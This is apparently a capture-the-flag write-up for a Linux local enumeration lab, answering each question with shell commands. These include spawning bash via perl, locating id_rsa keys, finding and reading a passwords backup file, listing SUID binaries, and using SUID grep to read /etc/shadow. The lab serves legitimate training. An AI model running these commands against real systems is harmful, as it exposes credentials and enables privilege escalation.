# Linux: Local Enumeration

- Let's go!

	  no answer needed

- How would you execute /bin/bash with perl?

	- `perl -e 'exec "/bin/bash";'`

- Where can you usually find the `id_rsa` file? (User = user)

	- `/home/user/.ssh/id_rsa`

- Is there an `id_rsa` file on the box? (yay/nay)

	- `nay`

- How would you print machine hardware name only?

	- `uname -m`

- Where can you find bash history?

	- `~/.bash_history`

- What's the flag?

	- `********************`

- Can you read /etc/passwd on the box? (yay/nay)

	- `yay`

- What's the password you found?

	- `find / -name *.bak -type f 2>/dev/null`
	- `cat /var/opt/passwords.bak`
	- `************`

- Did you find a flag?

	- `find / -type f -name "flag.conf" 2>/dev/null`
	- `cat /etc/sysconf/flag.conf`
	- `**************`

- Which SUID binary has a way to escalate your privileges on the box?

	- `find / -perm -4000 2>/dev/null`
	- `grep`

- What's the payload you can use to read /etc/shadow with this SUID?

	- `grep '' /etc/shadow`

- Try using those commands on your system! 

	  no answer needed

- Got it!

	  no answer needed

- Read the above and consider completing mentioned rooms.

	  no answer needed



